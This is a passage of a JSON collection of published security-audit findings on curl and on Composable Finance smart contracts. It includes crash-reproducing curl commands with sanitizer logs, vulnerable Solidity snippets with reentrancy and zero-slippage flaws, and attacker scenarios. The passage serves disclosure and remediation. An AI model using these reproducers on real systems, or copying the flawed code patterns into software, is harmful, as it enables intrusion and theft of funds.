        "description": "If cookies are passed to cURL via the --cookie ag, they will not be stripped if the target responds with a redirect. RFC 9110 section 15.4, Redirection 3xx , does not specify whether or not cookies should be stripped during a redirect; as such, it may be better to err on the side of caution and strip them by default if the origin changed. The recommended behavior would match the current behavior with cookie jar (i.e., when a server sets a new cookie and requests a redirect) and Authorization header (which is stripped on cross-origin redirects). Recommendations Short term, if backwards compatibility would not prohibit such a change, strip cookies upon a redirect to a dierent origin by default and provide a command-line ag that enables the previous behavior (or extend the --location-trusted ag). Long term, in cases where a specication is ambiguous and practicality allows, always default to the most secure possible interpretation. Extend tests to check for behavior of passing data after redirection.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Use after free while using parallel option and sequences ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "Using cURL with parallel option ( -Z ), two consecutive sequences (that end up creating 51 hosts), and an unmatched bracket triggers a use-after-free vulnerability (gure 10.1). The add_parallel_transfers function allocates memory blocks for an error buer; consequently, by default, it allows up to 50 transfers (gure 10.2, line 2228). Then, in the Curl_failf function, it copies errors (e.g., Could not resolve host: q{ ) to appropriate error buers when connections fail (gure 10.3) and frees the memory. For the last sequence ( u~ host), it allocates a memory buer (gure 10.2), frees a buer (gure 10.3), and copies an error ( Could not resolve host: u~ ) to the previously freed memory buer (gure 10.4). $ curl 0 -Z [q-u][u-~] } curl: (7) Failed to connect to 0.0.0.0 port 80 after 0 ms: Connection refused curl: (3) unmatched close brace/bracket in URL position 1: } ^ curl: (6) Could not resolve host: q{ curl: (6) Could not resolve host: q| curl: (6) Could not resolve host: q} curl: (6) Could not resolve host: q~ curl: (6) Could not resolve host: r{ curl: (6) Could not resolve host: r| curl: (6) Could not resolve host: r} curl: (6) Could not resolve host: r~ curl: (6) Could not resolve host: s{ curl: (6) Could not resolve host: s| curl: (6) Could not resolve host: s} curl: (6) Could not resolve host: s~ curl: (6) Could not resolve host: t{ curl: (6) Could not resolve host: t| curl: (6) Could not resolve host: t} curl: (6) Could not resolve host: t~ curl: (6) Could not resolve host: u{ curl: (6) Could not resolve host: u| curl: (6) Could not resolve host: u} curl: (3) unmatched close brace/bracket in URL position 1: } ^ ====2789144==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000004780 at pc 0x7f9b5f94016d bp 0x7fff12d4dbc0 sp 0x7fff12d4d368 WRITE of size #0 0x7f9b5f94016c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors. cc : 431 #1 0x7f9b5f7ce6f4 in strcpy /usr/ include /x86_64-linux-gnu/bits/string_fortified. h : 90 #2 0x7f9b5f7ce6f4 in Curl_failf /home/scooby/curl/lib/sendf. c : 275 #3 0x7f9b5f78309a in Curl_resolver_error /home/scooby/curl/lib/hostip. c : 1316 #4 0x7f9b5f73cb6f in Curl_resolver_is_resolved /home/scooby/curl/lib/asyn-thread. c : 596 #5 0x7f9b5f7bc77c in multi_runsingle /home/scooby/curl/lib/multi. c : 1979 #6 0x7f9b5f7bf00f in curl_multi_perform /home/scooby/curl/lib/multi. c : 2684 #7 0x55d812f7609e in parallel_transfers /home/scooby/curl/src/tool_operate. c : 2308 #8 0x55d812f7609e in run_all_transfers /home/scooby/curl/src/tool_operate. c : 2618 #9 0x55d812f7609e in operate /home/scooby/curl/src/tool_operate. c : 2732 #10 0x55d812f4ffa8 in main /home/scooby/curl/src/tool_main. c : 276 #11 0x7f9b5f1aa082 in __libc_start_main ../csu/libc- start . c : 308 #12 0x55d812f506cd in _start (/usr/ local /bin/curl+ 0x316cd ) 0x611000004780 is located 0 bytes inside of 256-byte region [0x611000004780,0x611000004880) freed by thread T0 here: #0 0x7f9b5f9b140f in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:122 #1 0x55d812f75682 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2251 previously allocated by thread T0 here: #0 0x7f9b5f9b1808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x55d812f75589 in add_parallel_transfers /home/scooby/curl/src/tool_operate.c:2228 SUMMARY: AddressSanitizer: heap-use-after-free ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy Shadow bytes around the buggy address: 0x0c227fff88a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff88d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff88e0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c227fff88f0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8910: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c227fff8920: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c227fff8930: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c227fff8940: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Heap left redzone: fa Freed heap region: fd ==2789144==ABORTING Figure 10.1: Reproducing use-after-free vulnerability with ASAN log 2192 static CURLcode add_parallel_transfers ( struct GlobalConfig *global, CURLM *multi, CURLSH *share, bool *morep, bool *addedp) 2197 { // (...) 2210 for (per = transfers; per && (all_added < global->parallel_max); per = per->next) { 2227 2228 // (...) 2249 if (!errorbuf) { errorbuf = malloc(CURL_ERROR_SIZE); result = create_transfer(global, share, &getadded); 2250 2251 2252 2253 if (result) { free(errorbuf); return result; } Figure 10.2: The add_parallel_transfers function ( curl/src/tool_operate.c#21922253 ) 264 265 { void Curl_failf ( struct Curl_easy *data, const char *fmt, ...) // (...) 275 strcpy(data->set.errorbuffer, error); Figure 10.3: The Curl_failf function that copies appropriate error to the error buer ( curl/lib/sendf.c#264275 ) Exploit Scenario An administrator sets up a service that calls cURL, where some of the cURL command-line arguments are provided from external, untrusted input. An attacker manipulates the input to exploit the use-after-free bug to run arbitrary code on the machine that runs cURL. Recommendations Short term, x the use-after-free vulnerability described in this nding. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Unused memory blocks are not freed resulting in memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "For specic commands (gure 11.1, 11.2, 11.3), cURL allocates blocks of memory that are not freed when they are no longer needed, leading to memory leaks. $ curl 0 -Z 0 -Tz 0 curl: Can 't open ' z '! curl: try ' curl --help ' or ' curl --manual' for more information curl: ( 26 ) Failed to open/read local data from file/application ============= 2798000 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 4848 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eba06 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:153 #1 0x561bb1d1dc9f in glob_url /home/scooby/curl/src/tool_urlglob.c:459 Indirect leak of 8 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e06c in glob_fixed /home/scooby/curl/src/tool_urlglob.c:48 #2 0x561bb1d1e06c in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e06c in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1e0b0 in glob_fixed /home/scooby/curl/src/tool_urlglob.c:53 #2 0x561bb1d1e0b0 in glob_parse /home/scooby/curl/src/tool_urlglob.c:411 #3 0x561bb1d1e0b0 in glob_url /home/scooby/curl/src/tool_urlglob.c:467 Indirect leak of 2 byte(s) in 1 object(s) allocated from: #0 0x7f868e6eb808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144 #1 0x561bb1d1dc6a in glob_url /home/scooby/curl/src/tool_urlglob.c:454 Figure 11.1: Reproducing memory leaks vulnerability in the tool_urlglob.c le with LeakSanitizer log. $ curl 00 --cu 00 curl: ( 7 ) Failed to connect to 0 .0.0.0 port 80 after 0 ms: Connection refused ============= 2798691 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 3 byte(s) in 1 object(s) allocated from: #0 0x7fbc6811b3ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x56412ed047ee in getparameter /home/scooby/curl/src/tool_getparam.c:1885 SUMMARY: AddressSanitizer: 3 byte(s) leaked in 1 allocation(s). Figure 11.2: Reproducing a memory leak vulnerability in the tool_getparam.c le with LeakSanitizer log $ curl --proto = 0 --proto = 0 Warning: unrecognized protocol '0' Warning: unrecognized protocol '0' curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information ================================================================= == 2799783 ==ERROR: LeakSanitizer: detected memory leaks Direct leak of 1 byte(s) in 1 object(s) allocated from: #0 0x7f90391803ed in __interceptor_strdup ../../../../src/libsanitizer/asan/asan_interceptors.cc:445 #1 0x55e405955ab7 in proto2num /home/scooby/curl/src/tool_paramhlp.c:385 SUMMARY: AddressSanitizer: 1 byte(s) leaked in 1 allocation(s). Figure 11.3: Reproducing a memory leak vulnerability in the tool_paramhlp.c le with LeakSanitizer log Exploit Scenario An attacker nds a way to allocate extensive lots of memory on the local machine, which leads to the overconsumption of resources and a denial-of-service attack. Recommendations Short term, x memory leaks described in this nding by freeing memory blocks that are no longer needed. Long term, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the argv-fuzz-inl.h from the AFL++ project to build argv from stdin in the cURL. Also, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Referer header is generated in insecure manner ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "The cURL automatically sets the referer header for HTTP redirects when provided with the --referer ;auto ag. The header set contains the entire original URL except for the user-password fragment. The URL includes query parameters, which is against current best practices for handling the referer , which say to default to the strict-origin-when-cross-origin option. The option instructs clients to send only the URLs origin for cross-origin redirect, and not to send the header to less secure destinations (e.g., when redirecting from HTTPS to HTTP protocol). Exploit Scenario An user uses cURL to send a request to a server that requires multi-step authorization. He provides the authorization token as a query parameter and enables redirects with --location ag. Because of the server misconguration, a 302 redirect response with an incorrect Location header that points to a third-party domain is sent back to the cURL. The cURL requests the third-party domain, leaking the authorization token via the referer header. Recommendations Short term, send only the origin instead of the whole URL on cross-origin requests in the referer header. Consider not sending the header on redirects downgrading the security level. Additionally, consider implementing support for the Referrer-Policy response header. Alternatively, introduce a new ag that would allow users to set the desired referrer policy manually. Long term, review response headers that change behavior of HTTP redirects and ensure either that they are supported by the cURL or that secure defaults are implemented. References  Feature: Referrer Policy: Default to strict-origin-when-cross-origin",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Redirect to localhost and local network is possible (Server-side request forgery like) ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "When redirects are enabled with cURL (i.e., the --location ag is provided), then a server may redirect a request to an arbitrary endpoint, and the cURL will issue a request to it. This gives requested servers partial access to cURLs users local networks. The issue is similar to the Server-Side Request Forgery (SSRF) attack vector, but in the context of the client application. Exploit Scenario An user sends a request using cURL to a malicious server using the --location ag. The server responds with a 302 redirect to http://192.168.0.1:1080?malicious=data endpoint, accessing the user's router admin panel. Recommendations Short term, add a warning about this attack vector in the --location ag documentation. Long term, consider disallowing redirects to private networks and loopback interface by either introducing a new ag that would disable the restriction or extending the --location-trusted ag functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. URL parsing from redirect is incorrect when no path separator is provided ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "When cURL parses a URL from the Location header for an HTTP redirect and the URL does not contain a path separator (/), the cURL incorrectly duplicates query strings (i.e., data after the question mark) and fragments (data after cross). The cURL correctly parses similar URLs when they are provided directly in the command line. This behavior indicates that dierent parsers are used for direct URLs and URLs from redirects, which may lead to further bugs. $ curl -v -L 'http://local.test?redirect=http://local.test:80?-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test:80?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test:80?-123 < Date: Mon, 10 Oct 2022 14 :53:46 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test:80/?-123?-123' * Found bundle for host: 0x6000039287b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?-123?-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :53: < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.1: Example logging output from cURL, presenting the bug in parsing URLs from the Location header, with port and query parameters $ curl -v -L 'http://local.test?redirect=http://local.test%23-123' * Trying 127 .0.0.1:80... * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET /?redirect=http://local.test%23-123 HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 302 Found < Location: http://local.test#-123 < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Transfer-Encoding: chunked < * Ignoring the response-body * Connection #0 to host local.test left intact * Issue another request to this URL: 'http://local.test/#-123#-123' * Found bundle for host: 0x6000003f47b0 [serially] * Re-using existing connection #0 with host local.test * Connected to local.test ( 127 .0.0.1) port 80 ( #0) > GET / HTTP/1.1 > Host: local.test > User-Agent: curl/7.86.0-DEV > Accept: */* > * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK < Date: Mon, 10 Oct 2022 14 :56:05 GMT < Connection: keep-alive < Keep-Alive: timeout = 5 < Content-Length: 16 < * Connection #0 to host local.test left intact HTTP Connection! Figure 14.2: Example logging output from cURL, presenting the bug in parsing URLs from Location header, without port and with fragment Exploit Scenario A user of cURL accesses data from a server. The server redirects cURL to another endpoint. cURL incorrectly duplicates the query string in the new request. The other endpoint uses the incorrect data, which negatively aects the user. Recommendations Short term, x the parsing bug in the Location header parser. Long term, use a single, centralized API for URL parsing in the whole cURL codebase. Expand tests with checks of parsing of redirect responses.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Initialization functions can be front-run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The CrosslayerPortal contracts have initializer functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Due to the use of the delegatecall proxy pattern, these contracts cannot be initialized with their own constructors, and they have initializer functions: function initialize() public initializer { __Ownable_init(); __Pausable_init(); __ReentrancyGuard_init(); } Figure 1.1: The initialize function in MsgSender:126-130 An attacker could front-run these functions and initialize the contracts with malicious values. This issue aects the following system contracts:  contracts/core/BridgeAggregator  contracts/core/InvestmentStrategyBase  contracts/core/MosaicHolding  contracts/core/MosaicVault  contracts/core/MosaicVaultConfig  contracts/core/functionCalls/MsgReceiverFactory  contracts/core/functionCalls/MsgSender  contracts/nfts/Summoner  contracts/protocols/aave/AaveInvestmentStrategy  contracts/protocols/balancer/BalancerV1Wrapper  contracts/protocols/balancer/BalancerVaultV2Wrapper  contracts/protocols/bancor/BancorWrapper  contracts/protocols/compound/CompoundInvestmentStrategy  contracts/protocols/curve/CurveWrapper  contracts/protocols/gmx/GmxWrapper  contracts/protocols/sushiswap/SushiswapLiquidityProvider  contracts/protocols/synapse/ISynapseSwap  contracts/protocols/synapse/SynapseWrapper  contracts/protocols/uniswap/IUniswapV2Pair  contracts/protocols/uniswap/UniswapV2Wrapper  contracts/protocols/uniswap/UniswapWrapper Exploit Scenario Bob deploys the MsgSender contract. Eve front-runs the contracts initialization and sets her own address as the owner address. As a result, she can use the initialize function to update the contracts variables, modifying the system parameters. Recommendations Short term, to prevent front-running of the initializer functions, use hardhat-deploy to initialize the contracts or replace the functions with constructors. Alternatively, create a deployment script that will emit sucient errors when an initialize call fails. Long term, carefully review the Solidity documentation, especially the Warnings section, as well as the pitfalls of using the delegatecall proxy pattern.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Trades are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The swapToNative function does not allow users to specify the minAmountOut parameter of swapExactTokensForETH , which indicates the minimum amount of ETH that a user will receive from a trade. Instead, the value is hard-coded to zero, meaning that there is no guarantee that users will receive any ETH in exchange for their tokens. By using a bot to sandwich a users trade, an attacker could increase the slippage incurred by the user and prot o of the spread at the users expense. The minAmountOut parameter is meant to prevent the execution of trades through illiquid pools and to provide protection against sandwich attacks. The current implementation lacks protections against high slippage and may cause users to lose funds. This applies to the AVAX version, too. Composable Finance indicated that only the relayer will call this function, but the function lacks access controls to prevent users from calling it directly. Importantly, it is highly likely that if a relayer does not implement proper protections, all of its trades will suer from high slippage, as they will represent pure-prot opportunities for sandwich bots. uint256 [] memory amounts = swapRouter.swapExactTokensForETH( _amount, 0 , path, _to, deadline ); Figure 2.1: Part of the SwapToNative function in MosaicNativeSwapperETH.sol: 4450 Exploit Scenario Bob, a relayer, makes a trade on behalf of a user. The minAmountOut value is set to zero, which means that the trade can be executed at any price. As a result, when Eve sandwiches the trade with a buy and sell order, Bob sells the tokens without purchasing any, eectively giving away tokens for free. Recommendations Short term, allow users (relayers) to input a slippage tolerance, and add access controls to the swapToNative function. Long term, consider the risks of integrating with other protocols such as Uniswap and implement mitigations for those risks.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. forwardCall creates a denial-of-service attack vector ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Low-level external calls can exhaust all available gas by returning an excessive amount of data, thereby causing the relayer to incur memory expansion costs. This can be used to cause an out-of-gas exception and is a denial-of-service (DoS) attack vector. Since arbitrary contracts can be called, Composable Finance should implement additional safeguards. If an out-of-gas exception occurs, the message will never be marked as forwarded ( forwarded[id] = true ). If the relayer repeatedly retries the transaction, assuming it will eventually be marked as forwarded, the queue of pending transactions will grow without bounds, with each unsuccessful message-forwarding attempt carrying a gas cost. The approveERC20TokenAndForwardCall function is also vulnerable to this DoS attack. (success, returnData) = _contract. call {value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require ( balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; Figure 3.1: Part of the forwardCall function in MsgReceiver:79-85 Exploit Scenario Eve deploys a contract that returns 10 million bytes of data. A call to that contract causes an out-of-gas exception. Since the transaction is not marked as forwarded, the relayer continues to propagate the transaction without success. This results in excessive resource consumption and a degraded quality of service. Recommendations Short term, require that the size of return data be xed to 32 bytes. Long term, review the documentation on low-level Solidity calls and EVM edge cases. References  Excessively Safe Call",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The owner of a contract in the Composable Finance ecosystem can be changed through a call to the transferOwnership function. This function internally calls the setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _setOwner( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 8.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Bob, a Composable Finance developer, invokes transferOwnership() to change the address of an existing contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, perform ownership transfers through a two-step process in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. sendFunds is vulnerable to reentrancy by owners ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The sendFunds function is vulnerable to reentrancy and can be used by the owner of a token contract to drain the contract of its funds. Specically, because fundsTransfered[user] is written to after a call to an external contract, the contracts owner could input his or her own address and reenter the sendFunds function to drain the contracts funds. An owner could send funds to him- or herself without using the reentrancy, but there is no reason to leave this vulnerability in the code. Additionally, the FundKeeper contract can send funds to any user by calling setAmountToSend and then sendFunds . It is unclear why amountToSend is not changed (set to zero) after a successful transfer. It would make more sense to call setAmountToSend after each transfer and to store users balances in a mapping. function setAmountToSend ( uint256 amount ) external onlyOwner { amountToSend = amount; emit NewAmountToSend(amount); } function sendFunds ( address user ) external onlyOwner { require (!fundsTransfered[user], \"reward already sent\" ); require ( address ( this ).balance >= amountToSend, \"Contract balance low\" ); // solhint-disable-next-line avoid-low-level-calls ( bool sent , ) = user.call{value: amountToSend}( \"\" ); require (sent, \"Failed to send Polygon\" ); fundsTransfered[user] = true ; emit FundSent(amountToSend, user); } Figure 9.1: Part of the sendFunds function in FundKeeper.sol:23-38 Exploit Scenario Eves smart contract is the owner of the FundKeeper contract. Eves contract executes a transfer for which Eve should receive only 1 ETH. Instead, because the user address is a contract with a fallback function, Eve can reenter the sendFunds function and drain all ETH from the contract. Recommendations Short term, set fundsTransfered[user] to true prior to making external calls. Long term, store each users balance in a mapping to ensure that users cannot make withdrawals that exceed their balances. Additionally, follow the checks-eects-interactions pattern.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "20. MosaicVault and MosaicHolding owner has excessive privileges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The owner of the MosaicVault and MosaicHolding contracts has too many privileges across the system. Compromise of the owners private key would put the integrity of the underlying system at risk. The owner of the MosaicVault and MosaicHolding contracts can perform the following privileged operations in the context of the contracts:       Rescuing funds if the system is compromised Managing withdrawals, transfers, and fee payments Pausing and unpausing the contracts Rebalancing liquidity across chains Investing in one or more investment strategies Claiming rewards from one or more investment strategies The ability to drain funds, manage liquidity, and claim rewards creates a single point of failure. It increases the likelihood that the contracts owner will be targeted by an attacker and increases the incentives for the owner to act maliciously. Exploit Scenario Alice, the owner of MosaicVault and MosaicHolding , deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, clearly document the functions and implementations that the owner of the MosaicVault and MosaicHolding contracts can change. Additionally, split the privileges provided to the owner across multiple roles (e.g., a fund manager, fund rescuer, owner, etc.) to ensure that no one address has excessive control over the system. Long term, develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. SushiswapLiquidityProvider deposits cannot be used to cover withdrawal requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Withdrawal requests that require the removal of liquidity from a Sushiswap liquidity pool will revert and cause a system failure. When a user requests a withdrawal of liquidity from the Mosaic system, MosaicVault (via the coverWithdrawRequest() function) queries MosaicHolding to see whether liquidity must be removed from an investment strategy to cover the withdrawal amount (gure 24.1). function _withdraw ( address _accountTo , uint256 _amount , address _tokenIn , address _tokenOut , uint256 _amountOutMin , WithdrawData calldata _withdrawData, bytes calldata _data ) { internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount ) IMosaicHolding mosaicHolding = IMosaicHolding(vaultConfig.getMosaicHolding()); require (hasBeenWithdrawn[_withdrawData.id] == false , \"ERR: ALREADY WITHDRAWN\" ); if (_tokenOut == _tokenIn) { require ( mosaicHolding.getTokenLiquidity(_tokenIn, _withdrawData.investmentStrategies) >= _amount, \"ERR: VAULT BAL\" ); } [...] mosaicHolding.coverWithdrawRequest( _withdrawData.investmentStrategies, _tokenIn, withdrawAmount ); [...] } Figure 24.1: The _ withdraw function in MosaicVault :40 4-474 If MosaicHolding s balance of the token being withdrawn ( _tokenIn ) is not sucient to cover the withdrawal, MosaicHolding will iterate through each investment strategy in the _investmentStrategy array and remove enough _tokenIn to cover it. To remove liquidity from an investment strategy, it calls withdrawInvestment() on that strategy (gure 24.2). function coverWithdrawRequest ( address [] calldata _investmentStrategies, address _token , uint256 _amount ) external override { require (hasRole(MOSAIC_VAULT, msg.sender ), \"ERR: PERMISSIONS A-V\" ); uint256 balance = IERC20(_token).balanceOf( address ( this )); if (balance >= _amount) return ; uint256 requiredAmount = _amount - balance; uint8 index ; while (requiredAmount > 0 ) { address strategy = _investmentStrategies[index]; IInvestmentStrategy investment = IInvestmentStrategy(strategy); uint256 investmentAmount = investment.investmentAmount(_token); uint256 amountToWithdraw = 0 ; if (investmentAmount >= requiredAmount) { amountToWithdraw = requiredAmount; requiredAmount = 0 ; } else { amountToWithdraw = investmentAmount; requiredAmount = requiredAmount - investmentAmount; } IInvestmentStrategy.Investment[] memory investments = new IInvestmentStrategy.Investment[]( 1 ); investments[ 0 ] = IInvestmentStrategy.Investment(_token, amountToWithdraw); IInvestmentStrategy(investment).withdrawInvestment(investments, \"\" ); emit InvestmentWithdrawn(strategy, msg.sender ); index++; } require (IERC20(_token).balanceOf( address ( this )) >= _amount, \"ERR: VAULT BAL\" ); } Figure 24.2: The coverWithdrawRequest function in MosaicHolding:217-251 This process works for an investment strategy in which the investments array function argument has a length of 1. However, in the case of SushiswapLiquidityProvider , the withdrawInvestment() function expects the investments array to have a length of 2 (gure 24.3). function withdrawInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; ( uint256 deadline , uint256 liquidity ) = abi.decode(_data, ( uint256 , uint256 )); IERC20Upgradeable pair = IERC20Upgradeable(getPair(investmentA.token, investmentB.token)); pair.safeIncreaseAllowance( address (sushiSwapRouter), liquidity); ( uint256 amountA , uint256 amountB ) = sushiSwapRouter.removeLiquidity( investmentA.token, investmentB.token, liquidity, investmentA.amount, investmentB.amount, address ( this ), deadline ); IERC20Upgradeable(investmentA.token).safeTransfer(mosaicHolding, amountA); IERC20Upgradeable(investmentB.token).safeTransfer(mosaicHolding, amountB); } Figure 24.3: The withdrawInvestment function in SushiswapLiquidityProvider :90-113 Thus, any withdrawal request that requires the removal of liquidity from SushiswapLiquidityProvider will revert. Exploit Scenario Alice wishes to withdraw liquidity ( tokenA ) that she deposited into the Mosaic system. The MosaicHolding contract does not hold enough tokenA to cover the withdrawal and thus tries to withdraw tokenA from the SushiswapLiquidityProvider investment strategy. The request reverts, and Alices withdrawal request fails, leaving her unable to access her funds. Recommendations Short term, avoid depositing user liquidity into the SushiswapLiquidityProvider investment strategy. Long term, take the following steps:   Identify and implement one or more data structures that will reduce the technical debt resulting from the use of the InvestmentStrategy interface. Develop a more eective solution for covering withdrawals that does not consistently require withdrawing funds from other investment strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. MosaicVault and MosaicHolding owner is controlled by a single private key ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
